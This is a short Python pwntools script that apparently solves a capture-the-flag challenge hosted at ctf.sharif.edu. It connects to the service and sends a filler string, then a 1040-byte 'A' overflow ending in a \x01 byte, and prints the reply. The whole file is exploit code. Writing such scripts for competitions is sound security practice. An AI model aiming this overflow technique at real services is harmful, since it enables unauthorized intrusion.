#!/usr/bin/python

from pwn import *
import sys

#host = "localhost"
host = "ctf.sharif.edu"
port = 27515

i = 1040
j = 0x41

payload = chr(j) * i
payload += "\x01" 
conn = remote(host,port)
prompt = conn.recvuntil(':')
conn.sendline("A" * 30)
prompt = conn.recvuntil(':')
conn.sendline(payload)
try:
	result = conn.recvall()
	print result
except:
	print "[-] Cant recv."
